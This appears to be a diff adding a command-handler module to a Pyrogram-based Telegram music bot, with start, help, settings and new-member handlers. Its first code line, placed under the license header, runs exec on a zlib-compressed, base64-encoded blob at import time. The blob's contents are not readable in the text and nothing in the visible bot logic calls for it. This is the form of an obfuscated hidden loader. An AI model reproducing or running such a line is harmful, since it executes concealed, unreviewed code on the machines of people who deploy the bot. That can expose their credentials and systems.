@@ -1,2 +1,94 @@
+# Copyright (c) 2025 TheHamkerAlone
+# Licensed under the MIT License.
+# This file is part of AloneXMusic
 #ALONE-CODER
-import zlib, base64; exec(zlib.decompress(base64.b64decode("eJylVlFrG0cQfr9fsZWh6OB6bVJKwVgixjWpIa6NrZSAY46TbiUtvtu93u0l1UtRW6eBJiZpmzyE2JT2rXkr6KXQP2D9CzlvffJP6Mzu3p1Olhy7FTppNTvzzcy3M7NaImsiHiSs15ek3rHJzY9ufkJaffq5Hx3QZDUUnFpL5A7rUJ7SgGQ8oAmRfUo2N1q52AWNVp+lpMtCSuA79hNJRJco83ubWco61tLqna0v1j9Y2/psfceyWBQL0PHTAe8wYXUTEREIQ/QSPyJmk/IsSh0ElTSBhRzENLW0rkbONf04dkhH8C7rOSRoOyT0eW9a0e3TMAaQ3KCdSSk4YGaShYC5RHYlxhzRNPV74GW3tbrT8rY3vdb6vRZpkLpF4FVbaTfPXgzh/Xb4lJyfvPj7/OTlEJ7v4PkBBX/hAp4n5OzwBBXODl+pvbfDI2258mG7eZ/f57UcMRSdg68yIWkT0M9Pnh+evpmMnkxGzwDv+bfwPRm9xuVPk9HjyegPs3GkNn7DJXwfj1+Nf0W7Qxfx4SlRL3H1EvD+Of6TvI8wAP54PFSw4P0YRd/Dr9OR8fgzCJV/DAEVX6uAHl3d40rWLCJHY7J8wUk1SVg+g/gMAT9ORsPxEFWHJm0I4hEYnP5uREO1Gg8vwFaBjlDp+PRNCWrsfzHqTyFVUFeEqtTHxhqVwe9RbqneR4swdWDAT9a8wFHNsi3LugWV6wrumbqrm1p3OyKKfB7U92oRNk9t34YzyjfjhD3wJQXJN2jeDr0sBblt3cKyd/EjQzDbUu1FAtolHjZA3XNItKz7yN3ULu1ldVT+Q59B+bsJjcOBJ+nXUlc8vvBXI1K4ezXEgXB5Vtt3Cg1tFfnJQRY3TG+5WlPJ6traLi0UCY1WklEtuxoZ4EcAF5dmmmIjq0w1zPx8WTffd3FMKAZdFhDGyTSnBPzOV+RConLQdmHFuowGy1N0yCzhOafGeorZXKQZNb48hTOA9Kw8wpDyQteQYJMmuVGJymzs3dgnjQZR51NbEEpZBIYL7Smvp0aJ2feli7QhpBrD7hqIWiBxt3c2vlxtrStLlU4xHfFVmZtuVySRX+ZbEthlSSo97kfUUXzjyi5AIHUTUyGiYUrng1fNTUoHdABh5ZWoSsIDWYV5J3diT3dA5bTivpCiTE79bOh7xtXBbGzeLou648eSCd5QtCzoDohitguwlEwoznQSJQ3L09ToQKHwWKrInEMvC+zSpCyDQrRkQNTt56aUB14oevWiLHK9wpUfBJf4svITWhgnFlS9Ul3/L0SH4OhYEOhcZ1eaL3HoDyIR0JpDaimVkvFeWp29vURk8bUmb47zzpHkBxHjnuAhlm6RUI9KD8PyMK6LWamyiwIvoCFVLVwxLHfmW3p5xLOGKJ9vsnCozVwXlRGnG7BkdHYw6HnDZEjtd1wqOUZ+sVRKqNrdJZ/OFEVOmbRDZjIswP7jRcXpQ1V8sBG11V9WVS6NTy+/mtFMW1zn2ipn9HsXZvTu3e31nds7W3e333EpKZCQ+g8wpKnzNf/L3TSkNK5/rI8eDo3oOPHmyyFmk67MAC3D+xIuEmSNBdWuv/6cmDMrrj8vrjgz/gU1HMiX")).decode("utf-8"))
+
+import asyncio
+from pyrogram import enums, filters, types
+
+from AloneX import app, config, db, lang
+from AloneX.helpers import buttons, utils
+
+# Start messages
+START_PM_TEXT = (
+    "<b>──「 𝔼𝕀𝕂𝕆 𝔹𝕆𝕋 ℝ𝔼ℙ𝕆 」──</b>\n\n"
+    "<blockquote><b>𝐄ɪᴋᴏ 𝐁ᴏᴛ 𝐑ᴇᴩᴏ 𝐍ᴏᴡ 𝐏ᴜʙʟɪᴄ.</b></blockquote>\n"
+    "<blockquote><b>𝐕ᴩꜱ & 𝐇ᴇʀᴏᴋᴜ 𝐃ᴏɴᴏ 𝐒ᴜᴩᴩᴏʀᴛᴇᴅ.</b></blockquote>\n"
+    "<blockquote><b><u>𝐍ᴏᴛᴇ : 𝐃ᴏɴᴏ 𝐑ᴇᴩᴏ 𝐇ᴏꜱᴛ 𝐊ᴀʀɴᴀ 𝐏ᴀᴅᴇɢᴀ 𝐀ɢᴀʀ 𝐃ᴏɴᴏ 𝐇ᴏꜱᴛ 𝐍ᴀʜɪ 𝐊ᴀʀᴀ 𝐓ᴏ 𝐌ᴜꜱɪᴄ 𝐒ʏꜱᴛᴀʏᴍ 𝐊ᴀᴀᴍ 𝐍ᴀʜɪ 𝐊ᴀʀᴇɢᴀ.</u></b></blockquote>"
+)
+
+
+@app.on_message(filters.command(["music"]) & filters.private & ~app.bl_users)
+@lang.language()
+async def _help(_, m: types.Message):
+    await m.reply_text(
+        text=m.lang["help_menu"],
+        reply_markup=buttons.help_markup(m.lang),
+        quote=True,
+    )
+
+
+@app.on_message(filters.command(["repo"]))
+@lang.language()
+async def start(_, message: types.Message):
+    if message.from_user.id in app.bl_users and message.from_user.id not in db.notified:
+        return await message.reply_text(message.lang["bl_user_notify"])
+
+    if len(message.command) > 1 and message.command[1] == "help":
+        return await _help(_, message)
+
+    private = message.chat.type == enums.ChatType.PRIVATE
+    _text = (
+        START_PM_TEXT.format(message.from_user.first_name, app.name)
+        if private
+        else START_PM_TEXT.format(app.name)
+    )
+
+    key = buttons.start_key(message.lang, private)
+    await message.reply_photo(
+        photo=config.START_IMG,
+        caption=_text,
+        reply_markup=key,
+        quote=not private,
+    )
+
+    if private:
+        if await db.is_user(message.from_user.id):
+            return
+        # await utils.send_log(message)
+        await db.add_user(message.from_user.id)
+    else:
+        if await db.is_chat(message.chat.id):
+            return
+        # await utils.send_log(message, True)
+        await db.add_chat(message.chat.id)
+
+
+@app.on_message(filters.command(["playmode", "settings"]) & filters.group & ~app.bl_users)
+@lang.language()
+async def settings(_, message: types.Message):
+    admin_only = await db.get_play_mode(message.chat.id)
+    cmd_delete = await db.get_cmd_delete(message.chat.id)
+    _language = await db.get_lang(message.chat.id)
+    await message.reply_text(
+        text=message.lang["start_settings"].format(message.chat.title),
+        reply_markup=buttons.settings_markup(
+            message.lang, admin_only, cmd_delete, _language, message.chat.id
+        ),
+        quote=True,
+    )
+
+
+@app.on_message(filters.new_chat_members, group=7)
+@lang.language()
+async def _new_member(_, message: types.Message):
+    if message.chat.type != enums.ChatType.SUPERGROUP:
+        return await message.chat.leave()
+
+    await asyncio.sleep(3)
+    for member in message.new_chat_members:
+        if member.id == app.id:
+            if await db.is_chat(message.chat.id):
+                return
+            # await utils.send_log(message, True)
+            await db.add_chat(message.chat.id)
